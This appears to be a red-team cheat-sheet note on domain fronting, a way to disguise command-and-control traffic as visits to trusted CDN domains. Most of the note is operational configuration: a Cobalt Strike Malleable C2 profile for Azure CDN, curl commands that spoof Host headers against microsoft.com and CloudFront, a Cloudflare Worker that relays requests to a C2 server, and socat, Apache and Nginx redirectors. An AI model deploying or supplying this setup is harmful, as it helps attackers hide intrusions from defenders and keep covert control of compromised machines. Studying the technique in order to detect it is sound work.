---
tags:
  - Defense_Evasion
  - Exfiltration
  - Foundational
  - HTTP
  - Network
---

## Domain Fronting
resources: [Domain Fronting - Fireeye](https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html)

> [!tip] Use CDN to hide true C2 destination. Traffic appears to go to legitimate domain but routes to attacker infrastructure.

### Theory

#### How Domain Fronting Works
> [!info] Fronting flow:
> 1. TLS connection to legitimate CDN domain (passes filters)
> 2. HTTP Host header specifies attacker domain on same CDN
> 3. CDN routes request to attacker based on Host header
> 4. Defenders see traffic to legitimate domain, miss actual C2

#### Requirements
> [!important] Prerequisites:
> - CDN that routes based on Host header
> - Attacker domain on same CDN as legitimate high-reputation domain
> - C2 framework that supports domain fronting

#### Domain Fronting Limitations
> [!warning] Limitations:
> - Many CDN providers have blocked this technique
> - Requires CDN account for attacker domain
> - SSL inspection may reveal Host header mismatch

### Domain Fronting with Azure CDN

#### Setup Azure CDN Profile [Local]
> [!tip] Setup steps:
> 1. Create Azure CDN endpoint pointing to C2 server
> 2. Configure custom domain or use provided azureedge.net domain
> 3. Configure C2 to accept connections on CDN hostname

#### Cobalt Strike Malleable C2 Profile
```text
set sample_name "Azure CDN Front";

https-certificate {
    set CN "*.azureedge.net";
}

http-get {
    set uri "/api/v1/update";

    client {
        header "Host" "<YourCDNEndpoint>.azureedge.net";
        header "Accept" "*/*";
    }
}

http-post {
    set uri "/api/v1/submit";

    client {
        header "Host" "<YourCDNEndpoint>.azureedge.net";
    }
}
```

#### Test Domain Fronting [Local]
```bash
curl -H "Host: <AttackerCDN>.azureedge.net" https://www.microsoft.com/
```

### CDN Setup Alternatives

#### Cloudflare Workers [alternative]
```javascript
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  url.hostname = '<C2Server>'
  return fetch(url, request)
}
```

#### AWS CloudFront [alternative]
> [!tip] Configure CloudFront distribution with C2 as origin. Use high-reputation domain for SNI.

```bash
# Test CloudFront fronting
curl -H "Host: <C2Distribution>.cloudfront.net" https://<LegitDomain>/
```

### Redirectors

#### Simple Redirector Setup [Local]
> [!tip] Redirect traffic from legitimate-looking domain to C2.

```bash
# socat redirector
socat TCP4-LISTEN:443,fork TCP4:<C2IP>:443
```

#### Apache Mod_Rewrite Redirector [Local]
```apache
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/api/.*
RewriteRule ^(.*)$ https://<C2Server>/$1 [P]
ProxyPassReverse / https://<C2Server>/
```

#### Nginx Reverse Proxy [Local]
```nginx
server {
    listen 443 ssl;
    server_name legitimate.com;

    location /api/ {
        proxy_pass https://<C2Server>/;
        proxy_set_header Host <C2Server>;
    }
}
```
